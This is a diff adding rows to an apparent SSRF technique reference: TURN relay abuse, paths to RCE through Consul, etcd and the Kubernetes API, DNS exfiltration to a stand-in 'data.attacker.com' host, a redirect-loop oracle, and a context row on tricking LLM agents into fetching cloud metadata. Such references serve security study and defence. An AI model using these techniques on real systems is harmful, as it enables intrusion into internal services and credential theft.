@@ -121,6 +121,7 @@ When only `http://` and `https://` are considered, alternative protocol schemes 
 | **tftp://** | Triggers UDP request; useful for OOB exfiltration | `tftp://attacker.com/file` | Library supports TFTP |
 | **ldap://** | LDAP queries against internal directory services | `ldap://127.0.0.1:389/` | LDAP service accessible |
 | **jar://** | Java-specific; fetches and processes JAR/ZIP archives | `jar:http://127.0.0.1!/file.txt` | Java runtime processes URLs |
+| **TURN relay** | Misconfigured TURN servers (WebRTC media relay) accept relay allocation requests targeting arbitrary internal IPs and ports, proxying TCP/UDP traffic through the TURN server's network position | `CreatePermission` → internal IP; `ChannelBind` → `10.0.0.1:6379` | TURN server exposed with weak or leaked credentials; permissive relay policy |
 
 ### §3-2. Scheme Obfuscation
 
@@ -143,6 +144,9 @@ The `gopher://` protocol deserves special attention as it enables arbitrary TCP 
 | **SMTP** | Craft email messages with arbitrary headers/body | Phishing, spam relay, internal notification abuse |
 | **FastCGI** | Send specially crafted FastCGI records | RCE via PHP_VALUE/PHP_ADMIN_VALUE injection |
 | **Zabbix Agent** | Send agent protocol commands | Command execution via `system.run` |
+| **HashiCorp Consul** | Register a malicious service via `/v1/agent/service/register` with a script check payload | RCE through periodic health-check script execution |
+| **etcd** | Read/write key-value pairs via `/v2/keys/` REST API or gRPC gateway | Credential extraction, configuration tampering, cluster disruption |
+| **Kubernetes API** | Create pod spec with `hostPath` volume mount via `/api/v1/namespaces/default/pods` | Container escape to host filesystem; node-level RCE |
 
 ---
 
@@ -286,6 +290,7 @@ SSRF doesn't always come from an obvious "URL" parameter. Diverse application fe
 | **Image/file URL parameters** | Profile picture URL, avatar URL, file preview | `?avatar_url=http://169.254.169.254/` |
 | **API integrations** | Endpoint URL fields in third-party service configuration | Slack incoming webhook URL, API base URL configuration |
 | **LLM/AI tool use** | AI agents fetching URLs from user prompts | "Summarize this article: http://169.254.169.254/" fed to an LLM with web access |
+| **Mobile app headless browser** | Embedded headless browser (WebView, custom Chromium) in mobile/server app renders attacker-controlled HTML; JavaScript executes server-side requests and exfiltrates responses via DNS tunneling to attacker nameserver | Android app with headless Chromium navigates to malicious page; JS triggers `fetch()` to internal endpoints; data exfiltrated via DNS queries to `data.attacker.com` |
 
 ### §7-3. Blind SSRF and Out-of-Band Techniques
 
@@ -299,6 +304,7 @@ When the server's response is not returned to the attacker, blind SSRF requires 
 | **Error-based inference** | Different HTTP status codes or error messages reveal reachability | Verbose error responses |
 | **Response size inference** | Content-length differences indicate different internal responses | Side-channel observable |
 | **SSRF canary chaining** | Blind SSRF hits internal service that makes external callback | Internal service has outbound capability |
+| **Redirect loop status-code oracle** | Constructing deliberate HTTP redirect loops and observing the returned status codes or timeout behavior across varying chain depths. Servers differ in loop detection thresholds and error responses — some return 3xx at each hop, others collapse to a final error after N redirects. The variation in status codes across iterations reveals intermediate redirect destinations, leaking internal URLs and service topology that would otherwise be invisible in blind SSRF | Application follows redirects; server-side redirect behavior varies by depth or loop detection mechanism (SlCyber/Assetnote, 2025) |
 
 ---
 
@@ -575,3 +581,5 @@ The 452% increase in SSRF attacks observed in 2024 — driven partly by AI-autom
 - Detectify Labs — "SSRF Vulnerabilities and Where to Find Them": https://labs.detectify.com/security-guidance/ssrf-vulnerabilities-and-where-to-find-them/
 - Intigriti — "SSRF: A Complete Guide to Exploiting Advanced SSRF Vulnerabilities": https://www.intigriti.com/researchers/blog/hacking-tools/ssrf-a-complete-guide-to-exploiting-advanced-ssrf-vulnerabilities
 - Qualys — "Unmasking AWS IMDSv1: The Hidden Flaw in AWS Security": https://blog.qualys.com/vulnerabilities-threat-research/2024/09/12/totalcloud-insights-unmasking-aws-instance-metadata-service-v1-imdsv1-the-hidden-flaw-in-aws-security
+- Doyensec — "The Danger of Falling to System Role in AWS SDK Client" (2022): AWS SDK client default credential chain falling back to system-level IAM role, enabling privilege escalation
+- Invicti — "SSRF vulnerabilities caused by SNI proxy misconfigurations" (2022): TLS SNI-Host mismatch routing to internal backends
